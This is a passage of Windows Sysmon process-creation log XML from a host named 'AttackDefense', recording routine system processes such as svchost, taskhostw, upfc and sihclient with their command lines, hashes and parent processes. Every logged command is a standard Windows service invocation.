Name='LogonGuid'>{221ce7aa-6c88-6409-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=8A0A29438052FAED8A2532DA50455756,SHA256=7FD065BAC18C5278777AE44908101CDFED72D26FA741367F0AD4D02020787AB6,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69</Data><Data Name='ParentProcessGuid'>{221ce7aa-6c87-6409-0b00-00000000dd00}</Data><Data Name='ParentProcessId'>580</Data><Data Name='ParentImage'>C:\Windows\System32\services.exe</Data><Data Name='ParentCommandLine'>C:\Windows\system32\services.exe</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-03-10T16:22:18.964421400Z'/><EventRecordID>1445</EventRecordID><Correlation/><Execution ProcessID='2472' ThreadID='3180'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>AttackDefense</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2023-03-10 16:22:18.962</Data><Data Name='ProcessGuid'>{221ce7aa-593a-640b-b401-00000000dd00}</Data><Data Name='ProcessId'>1784</Data><Data Name='Image'>C:\Windows\System32\svchost.exe</Data><Data Name='FileVersion'>10.0.17763.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Host Process for Windows Services</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>svchost.exe</Data><Data Name='CommandLine'>C:\Windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{221ce7aa-6c88-6409-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=8A0A29438052FAED8A2532DA50455756,SHA256=7FD065BAC18C5278777AE44908101CDFED72D26FA741367F0AD4D02020787AB6,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69</Data><Data Name='ParentProcessGuid'>{221ce7aa-6c87-6409-0b00-00000000dd00}</Data><Data Name='ParentProcessId'>580</Data><Data Name='ParentImage'>C:\Windows\System32\services.exe</Data><Data Name='ParentCommandLine'>C:\Windows\system32\services.exe</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-03-10T13:24:52.939503700Z'/><EventRecordID>1441</EventRecordID><Correlation/><Execution ProcessID='2472' ThreadID='3180'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>AttackDefense</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2023-03-10 13:24:52.937</Data><Data Name='ProcessGuid'>{221ce7aa-2fa4-640b-b101-00000000dd00}</Data><Data Name='ProcessId'>4940</Data><Data Name='Image'>C:\Windows\System32\taskhostw.exe</Data><Data Name='FileVersion'>10.0.17763.831 (WinBuild.160101.0800)</Data><Data Name='Description'>Host Process for Windows Tasks</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>taskhostw.exe</Data><Data Name='CommandLine'>taskhostw.exe USER</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>ATTACKDEFENSE\Administrator</Data><Data Name='LogonGuid'>{221ce7aa-6da3-6409-795a-050000000000}</Data><Data Name='LogonId'>0x55a79</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=106B2AEC107DFD22DB51C7A1B29623F8,SHA256=CA620F4DE4A426F129445E4D8A545B7B08B021080E7375A3EA3ED8C8A7212A8F,IMPHASH=9839C7FD9649496B162F72128209528A</Data><Data Name='ParentProcessGuid'>{00000000-0000-0000-0000-000000000000}</Data><Data Name='ParentProcessId'>1464</Data><Data Name='ParentImage'>-</Data><Data Name='ParentCommandLine'>-</Data><Data Name='ParentUser'>-</Data></EventData></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-03-10T14:22:18.961775900Z'/><EventRecordID>1443</EventRecordID><Correlation/><Execution ProcessID='2472' ThreadID='3180'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>AttackDefense</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2023-03-10 14:22:18.960</Data><Data Name='ProcessGuid'>{221ce7aa-3d1a-640b-b201-00000000dd00}</Data><Data Name='ProcessId'>3396</Data><Data Name='Image'>C:\Windows\System32\svchost.exe</Data><Data Name='FileVersion'>10.0.17763.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Host Process for Windows Services</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>svchost.exe</Data><Data Name='CommandLine'>C:\Windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{221ce7aa-6c88-6409-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=8A0A29438052FAED8A2532DA50455756,SHA256=7FD065BAC18C5278777AE44908101CDFED72D26FA741367F0AD4D02020787AB6,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69</Data><Data Name='ParentProcessGuid'>{221ce7aa-6c87-6409-0b00-00000000dd00}</Data><Data Name='ParentProcessId'>580</Data><Data Name='ParentImage'>C:\Windows\System32\services.exe</Data><Data Name='ParentCommandLine'>C:\Windows\system32\services.exe</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-03-10T17:20:10.985400800Z'/><EventRecordID>1450</EventRecordID><Correlation/><Execution ProcessID='2472' ThreadID='3180'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>AttackDefense</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2023-03-10 17:20:10.984</Data><Data Name='ProcessGuid'>{221ce7aa-66ca-640b-b501-00000000dd00}</Data><Data Name='ProcessId'>1120</Data><Data Name='Image'>C:\Windows\System32\upfc.exe</Data><Data Name='FileVersion'>10.0.17763.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Updateability From SCM</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>upfc.exe</Data><Data Name='CommandLine'>C:\Windows\System32\Upfc.exe /launchtype periodic /cv YihTb1XO9kGj7uKS2KtPpQ.0</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{221ce7aa-6c88-6409-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=AC3DA8AAC02C94DC65ECDF9548E6372D,SHA256=AE4B0E81C601521DA974D53E44295C98331CED7C9CC2F260434E6BC0C475DDA3,IMPHASH=B3371ED99D25FEFF460973E2D1E5A076</Data><Data Name='ParentProcessGuid'>{221ce7aa-6c87-6409-0b00-00000000dd00}</Data><Data Name='ParentProcessId'>580</Data><Data Name='ParentImage'>C:\Windows\System32\services.exe</Data><Data Name='ParentCommandLine'>C:\Windows\system32\services.exe</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-03-10T17:22:18.974001600Z'/><EventRecordID>1455</EventRecordID><Correlation/><Execution ProcessID='2472' ThreadID='3180'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>AttackDefense</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2023-03-10 17:22:18.971</Data><Data Name='ProcessGuid'>{221ce7aa-674a-640b-ba01-00000000dd00}</Data><Data Name='ProcessId'>2072</Data><Data Name='Image'>C:\Windows\System32\svchost.exe</Data><Data Name='FileVersion'>10.0.17763.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Host Process for Windows Services</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>svchost.exe</Data><Data Name='CommandLine'>C:\Windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{221ce7aa-6c88-6409-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=8A0A29438052FAED8A2532DA50455756,SHA256=7FD065BAC18C5278777AE44908101CDFED72D26FA741367F0AD4D02020787AB6,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69</Data><Data Name='ParentProcessGuid'>{221ce7aa-6c87-6409-0b00-00000000dd00}</Data><Data Name='ParentProcessId'>580</Data><Data Name='ParentImage'>C:\Windows\System32\services.exe</Data><Data Name='ParentCommandLine'>C:\Windows\system32\services.exe</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-03-10T17:51:22.739704600Z'/><EventRecordID>1458</EventRecordID><Correlation/><Execution ProcessID='2472' ThreadID='3180'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>AttackDefense</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2023-03-10 17:51:22.737</Data><Data Name='ProcessGuid'>{221ce7aa-6e1a-640b-bd01-00000000dd00}</Data><Data Name='ProcessId'>240</Data><Data Name='Image'>C:\Windows\System32\svchost.exe</Data><Data Name='FileVersion'>10.0.17763.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Host Process for Windows Services</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>svchost.exe</Data><Data Name='CommandLine'>C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p -s WinHttpAutoProxySvc</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\LOCAL SERVICE</Data><Data Name='LogonGuid'>{221ce7aa-6c89-6409-e503-000000000000}</Data><Data Name='LogonId'>0x3e5</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=8A0A29438052FAED8A2532DA50455756,SHA256=7FD065BAC18C5278777AE44908101CDFED72D26FA741367F0AD4D02020787AB6,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69</Data><Data Name='ParentProcessGuid'>{221ce7aa-6c87-6409-0b00-00000000dd00}</Data><Data Name='ParentProcessId'>580</Data><Data Name='ParentImage'>C:\Windows\System32\services.exe</Data><Data Name='ParentCommandLine'>C:\Windows\system32\services.exe</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-03-10T17:20:41.009780800Z'/><EventRecordID>1451</EventRecordID><Correlation/><Execution ProcessID='2472' ThreadID='3180'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>AttackDefense</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2023-03-10 17:20:41.007</Data><Data Name='ProcessGuid'>{221ce7aa-66e9-640b-b601-00000000dd00}</Data><Data Name='ProcessId'>2972</Data><Data Name='Image'>C:\Windows\System32\SIHClient.exe</Data><Data Name='FileVersion'>10.0.17763.1457 (WinBuild.160101.0800)</Data><Data Name='Description'>SIH Client</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>sihclient.exe</Data><Data Name='CommandLine'>C:\Windows\System32\sihclient.exe  /cv YihTb1XO9kGj7uKS2KtPpQ.0.1</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{221ce7aa-6c88-6409-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=01AB9A5EB2137F371CE2E30013599F78,SHA256=FE7054C47862CA79944FAE4F6892CB75000D4196DC9B739993B052817B89D688,IMPHASH=6F6CDE46652EF17415C88C40F3A26CEB</Data><Data Name='ParentProcessGuid'>{221ce7aa-66ca-640b-b501-00000000dd00}</Data><Data Name='ParentProcessId'>1120</Data><Data Name='ParentImage'>C:\Windows\System32\upfc.exe</Data><Data Name='ParentCommandLine'>C:\Windows\System32\Upfc.exe /launchtype periodic /cv YihTb1XO9kGj7uKS2KtPpQ.0</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-03-10T17:20:41.100583800Z'/><EventRecordID>1452</EventRecordID><Correlation/><Execution ProcessID='2472' ThreadID='3180'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>AttackDefense</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2023-03-10 17:20:41.099</Data><Data Name='ProcessGuid'>{221ce7aa-66e9-640b-b801-00000000dd00}</Data><Data Name='ProcessId'>3100</Data><Data Name='Image'>C:\Windows\System32\svchost.exe</Data><Data Name='FileVersion'>10.0.17763.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Host Process for Windows Services</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>svchost.exe</Data><Data Name='CommandLine'>C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p -s WinHttpAutoProxySvc</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\LOCAL SERVICE</Data><Data Name='LogonGuid'>{221ce7aa-6c89-6409-e503-000000000000}</Data><Data Name='LogonId'>0x3e5</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=8A0A29438052FAED8A2532DA50455756,SHA256=7FD065BAC18C5278777AE44908101CDFED72D26FA741367F0AD4D02020787AB6,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69</Data><Data Name='ParentProcessGuid'>{221ce7aa-6c87-6409-0b00-00000000dd00}</Data><Data Name='ParentProcessId'>580</Data><Data Name='ParentImage'>C:\Windows\System32\services.exe</Data><Data Name='ParentCommandLine'>C:\Windows\system32\services.exe</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-03-10T13:22:18.949355300Z'/><EventRecordID>1440</EventRecordID><Correlation/><Execution ProcessID='2472' ThreadID='3180'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>AttackDefense</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2023-03-10 13:22:18.947</Data><Data Name='ProcessGuid'>{221ce7aa-2f0a-640b-b001-00000000dd00}</Data><Data Name='ProcessId'>1556</Data><Data Name='Image'>C:\Windows\System32\svchost.exe</Data><Data Name='FileVersion'>10.0.17763.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Host Process for Windows Services</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>svchost.exe</Data><Data Name='CommandLine'>C:\Windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{221ce7aa-6c88-6409-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=8A0A29438052FAED8A2532DA50455756,SHA256=7FD065BAC18C5278777AE44908101CDFED72D26FA741367F0AD4D02020787AB6,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69</Data><Data Name='ParentProcessGuid'>{221ce7aa-6c87-6409-0b00-00000000dd00}</Data><Data Name='ParentProcessId'>580</Data><Data Name='ParentImage'>C:\Windows\System32\services.exe</Data><Data Name='ParentCommandLine'>C:\Windows\system32\services.exe</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2023-03-10T11:22:18.952448500Z'/><EventRecordID>1426</EventRecordID><Correlation/><Execution ProcessID='2472' ThreadID='3180'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>AttackDefense</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2023-03-10 11:22:18.950</Data><Data Name='ProcessGuid'>{221ce7aa-12ea-640b-a901-00000000dd00}</Data><Data Name='ProcessId'>976</Data><Data Name='Image'>C:\Windows\System32\svchost.exe</Data><Data Name='FileVersion'>10.0.17763.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Host Process for Windows Services</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>svchost.exe</Data><Data Name='CommandLine'>C:\Windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{221ce7aa-6c88-6409-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=8A0A29438052FAED8A2532DA50455756,SHA256=7FD065BAC18C5278777AE44908101CDFED72D26FA741367F0AD4D02020787AB6,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69</Data><Data Name='ParentProcessGuid'>{221ce7aa-6c87-6409-0b00-00000000dd00}</Data><Data Name='ParentProcessId'>580</Data><Data Name='ParentImage'>C:\Windows\System32\services.exe</Data><Data Name='ParentCommandLine'>C:\Windows\system32\services.exe</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event>